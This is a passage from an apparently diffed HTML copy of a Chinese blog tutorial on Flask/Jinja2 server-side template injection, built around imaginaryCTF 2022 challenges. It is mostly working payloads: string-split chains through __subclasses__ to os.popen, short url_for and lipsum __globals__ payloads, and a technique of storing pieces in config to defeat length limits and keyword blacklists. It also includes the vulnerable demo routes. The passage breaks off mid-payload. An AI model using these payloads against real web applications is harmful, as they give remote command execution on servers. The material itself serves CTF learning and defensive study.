+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="p">{{&lt;/span>&lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;__cla&amp;#39;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s1">&amp;#39;ss__&amp;#39;&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="s1">&amp;#39;__ba&amp;#39;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s1">&amp;#39;se__&amp;#39;&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="s1">&amp;#39;__subclass&amp;#39;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s1">&amp;#39;es__&amp;#39;&lt;/span>&lt;span class="p">]()[&lt;/span>&lt;span class="mi">306&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="s1">&amp;#39;__in&amp;#39;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s1">&amp;#39;it__&amp;#39;&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="s1">&amp;#39;__glob&amp;#39;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s1">&amp;#39;als__&amp;#39;&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="s1">&amp;#39;o&amp;#39;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s1">&amp;#39;s&amp;#39;&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="s1">&amp;#39;po&amp;#39;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s1">&amp;#39;pen&amp;#39;&lt;/span>&lt;span class="p">](&lt;/span>&lt;span class="s1">&amp;#39;who&amp;#39;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s1">&amp;#39;ami&amp;#39;&lt;/span>&lt;span class="p">)[&lt;/span>&lt;span class="s1">&amp;#39;re&amp;#39;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s1">&amp;#39;ad&amp;#39;&lt;/span>&lt;span class="p">]()}}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="数字过滤绕过">数字过滤绕过
+&lt;/h3>&lt;p>​ 假设过滤了数字，我们可以采用内置方法length和int获取数字，如果长度有所限制，则可以搭配request对象来绕过：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="nb">set&lt;/span> &lt;span class="n">a&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;aaaa&amp;#39;&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="n">length&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">}{&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="c1">#输出整型4&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="nb">set&lt;/span> &lt;span class="n">a&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">request&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">args&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="nb">int&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">}{&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="c1">#GET参数传入123，输出整型123&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{{&lt;/span>&lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="vm">__class__&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">__base__&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">__subclasses__&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="fm">__getitem__&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">request&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">args&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="nb">int&lt;/span>&lt;span class="p">)}}&lt;/span>&lt;span class="c1">#GET参数输入306，获取到第306个子类&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="长度绕过">长度绕过
+&lt;/h3>&lt;h4 id="使用长度较短的payload">使用长度较短的payload：
+&lt;/h4>&lt;p>​ 这里我先给出一个简单的示例&lt;/p>
+&lt;h5 id="原题imaginaryctf-2022---ssti-golf">原题：imaginaryCTF 2022 - SSTI Golf
+&lt;/h5>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="nd">@app.route&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/length-limiti&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">ssti&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">query&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">request&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">args&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;query&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="s1">&amp;#39;query&amp;#39;&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">request&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">args&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="s1">&amp;#39;...&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">query&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">query&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="mi">49&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="s2">&amp;#34;Too long!&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">render_template_string&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">query&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ 在这个示例中，限制了长度为49，如果使用之前提到的方式去注入，显然会出现过长的情况。所以这里要使用其他的方式进行注入，比如使用Flask内置的全局函数。&lt;/p>
+&lt;p>​ &lt;strong>url_for&lt;/strong>：此函数全局空间下存在 &lt;strong>eval()&lt;/strong> 和 &lt;strong>os 模块&lt;/strong>&lt;/p>
+&lt;p>​ &lt;strong>lipsum&lt;/strong>：此函数全局空间下存在 &lt;strong>eval()&lt;/strong> 和 &lt;strong>os 模块&lt;/strong>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="p">{{&lt;/span>&lt;span class="n">url_for&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="vm">__globals__&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">popen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>&lt;span class="p">()}}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{{&lt;/span>&lt;span class="n">lipsum&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="vm">__globals__&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">popen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>&lt;span class="p">()}}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218123117627.png"
+width="1229"
+height="353"
+srcset="https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218123117627_hu17564709699949674296.png 480w, https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218123117627_hu11170464008004014056.png 1024w"
+loading="lazy"
+alt="image-20241218123117627"
+class="gallery-image"
+data-flex-grow="348"
+data-flex-basis="835px"
+>&lt;/p>
+&lt;h4 id="将payload保存在config中">将payload保存在config中
+&lt;/h4>&lt;p>​ 我们已知config实际上是一个保存了全局变量的字典：&lt;/p>
+&lt;p>&lt;img src="https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218123401297.png"
+width="1540"
+height="346"
+srcset="https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218123401297_hu8467465519316924257.png 480w, https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218123401297_hu7341768434632753193.png 1024w"
+loading="lazy"
+alt="image-20241218123401297"
+class="gallery-image"
+data-flex-grow="445"
+data-flex-basis="1068px"
+>&lt;/p>
+&lt;p>​ 那么我们就可以使用赋值的方式将payload保存在config中。而set方法则是设置变量，所以我们可以实现如下操作：&lt;/p>
+&lt;p>&lt;img src="https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218123641662.png"
+width="1501"
+height="394"
+srcset="https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218123641662_hu14219004439418310045.png 480w, https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218123641662_hu11493824792898391731.png 1024w"
+loading="lazy"
+alt="image-20241218123641662"
+class="gallery-image"
+data-flex-grow="380"
+data-flex-basis="914px"
+>&lt;/p>
+&lt;p>​ 可以看到，s:string被保存到了config中，所以我们可以将payload保存在config中，以此绕过长度限制。以下是一个简单的示例：&lt;/p>
+&lt;h5 id="原题imaginaryctf-2022---minigolf">原题：imaginaryCTF 2022 - minigolf
+&lt;/h5>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="nd">@app.route&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/config-bypass&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">methods&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;GET&amp;#39;&lt;/span>&lt;span class="p">])&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">config_bypass&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">blacklist&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;{{&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;}}&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;[&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;]&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;_&amp;#34;&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">request&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">args&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="s2">&amp;#34;txt&amp;#34;&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">request&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">args&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">keys&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">txt&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">html&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">escape&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">request&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">args&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;txt&amp;#34;&lt;/span>&lt;span class="p">])&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="nb">any&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="n">n&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">txt&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="n">n&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">blacklist&lt;/span>&lt;span class="p">]):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="s2">&amp;#34;Not allowed.&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">txt&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;lt;=&lt;/span> &lt;span class="mi">69&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">render_template_string&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">txt&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="s2">&amp;#34;Too long.&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">Response&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="vm">__file__&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="n">mimetype&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;text/plain&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ 分析代码可知，这里将长度限制在69，且拦截部分关键词，这里我们对拦截的关键词进行简单的绕过：&lt;/p>
+&lt;p>&amp;lsquo;{{&amp;lsquo;和&amp;rsquo;}}&amp;rsquo;：这里拦截了花括号，我们可以使用{%%}绕过。&lt;/p>
+&lt;p>&amp;lsquo;[&amp;lsquo;和&amp;rsquo;]&amp;rsquo;：这里拦截可中括号，导致我们无法调用对象方法，我们可以使用attr()过滤器来代替。&lt;/p>
+&lt;p>&amp;lsquo;_&amp;rsquo;：拦截了下划线，导致我们无法调用魔术方法，这里可以使用attr()配合字符编码或者从request对象中获取参数来绕过。&lt;/p>
+&lt;p>​ 在明晰了绕过方法后，我们先选择payload，基于这个payload的去构造config：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="p">{{&lt;/span>&lt;span class="n">lipsum&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="vm">__globals__&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">popen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>&lt;span class="p">()}}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ 由于url_for中有一个下划线，所以这里我们选择lipsum方法。我们先将lipsum放入config中&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="nb">set&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">config&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">update&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">l&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">lipsum&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ &lt;img src="https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218125208854.png"
+width="705"
+height="48"
+srcset="https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218125208854_hu16560042916839771622.png 480w, https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218125208854_hu13699993095980686935.png 1024w"
+loading="lazy"
+alt="image-20241218125208854"
+class="gallery-image"
+data-flex-grow="1468"
+data-flex-basis="3525px"
+>&lt;/p>
+&lt;p>​ 然后把globals放入config中，这里由于下划线被拦截，所以我们利用request对象绕一下。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="nb">set&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">config&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">update&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">request&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">args&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">g&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">}{&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">config&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">g&lt;/span>&lt;span 